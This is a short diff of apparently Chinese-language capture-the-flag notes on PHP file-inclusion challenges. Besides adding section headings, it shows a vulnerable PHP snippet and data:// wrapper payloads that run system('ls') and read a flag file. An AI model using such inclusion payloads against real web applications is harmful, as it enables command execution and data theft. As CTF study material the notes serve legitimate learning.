@@ -1,3 +1,4 @@
+1.php文件动态包含拿flag
 <?php
 show_source(__FILE__);
 echo $_GET['hello'];
@@ -40,3 +41,7 @@ while (strstr($page, "php://")) {       //判断包含的文件是否有php：//
 方法2：
 data伪协议代码执行:http://.......?page=data://text/plain,<?php system("ls")?>
                                  ?page=data://text/plain,<?php system("cat fl4gisisish3r3.php")?>
+
+2.php验证GET参数a,b,c的合法性拿flag：
+
+
